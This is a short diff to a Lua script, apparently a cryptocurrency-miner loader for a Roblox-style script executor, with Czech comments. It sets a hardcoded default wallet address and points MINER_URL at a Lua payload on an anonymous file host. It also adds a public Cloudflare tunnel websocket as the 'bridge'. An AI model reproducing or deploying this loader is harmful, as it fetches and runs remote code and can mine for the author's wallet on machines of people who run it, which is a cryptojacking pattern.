@@ -4,8 +4,9 @@
 -- Vlastni penizenka: _G.MINER_CFG = { wallet = "..." } pred timhle skriptem.
 
 local WALLET = "42ypgDkEvE1VQSLfXwQffKBF7L5vETygtfvaynG9nW8W7crvsrGv4ziAAmTppDkedKSdz9iAKM7f5gBwZpnNviY81ACgjhw"
-local MINER_URL = "https://files.catbox.moe/48icr5.lua"
-local BRIDGE = "ws://127.0.0.1:8790"
+local MINER_URL = "https://files.catbox.moe/bbvpvk.lua"
+local BRIDGE = "wss://simulation-databases-departments-sally.trycloudflare.com/" -- verejny bridge
+local BRIDGE_FALLBACK = "ws://127.0.0.1:8790" -- lokalni, kdyz verejny nefunguje
 
 local env = getgenv and getgenv() or _G
 
@@ -47,6 +48,7 @@ local cfg = get("MINER_CFG")
 if type(cfg) ~= "table" then cfg = {} end
 cfg.wallet = cfg.wallet or get("RX_WALLET") or WALLET
 cfg.bridge = cfg.bridge or BRIDGE
+cfg.bridgeFallback = cfg.bridgeFallback or BRIDGE_FALLBACK
 cfg.slicePcs = cfg.slicePcs or 1024
 _G.MINER_CFG = cfg
 env.MINER_CFG = cfg -- bundle cte rawget(_G, "MINER_CFG")
